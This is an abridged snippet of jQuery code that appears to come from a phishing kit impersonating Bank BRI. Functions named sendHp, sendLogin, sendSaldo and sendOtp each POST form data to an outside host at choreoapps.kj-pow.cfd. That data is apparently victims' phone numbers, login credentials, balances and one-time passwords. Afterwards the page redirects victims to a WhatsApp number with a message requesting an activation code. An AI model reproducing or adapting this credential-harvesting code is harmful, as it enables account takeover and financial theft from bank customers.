function sendHp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/27/no.php',
...
function sendLogin() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/27/login.php',
...
function sendSaldo() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/27/saldo.php',
        data: $('#sald').serialize(),
        datatype: 'JSON',
      complete: function() {
         setTimeout(function() {
...
function sendOtp() {
   ...
   $.ajax({
        type: 'POST',
        url: 'https://choreoapps.kj-pow.cfd/27/otp.php',
...
$(document).ready(function() {
 ...
 $('.load').fadeIn();
    setTimeout(function(){      
location.href='https://wa.me/6285134087623?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20Aktivasi';
 $("#process1").hide();
 $('.load').fadeOut();        
         }, 2000);
     });    
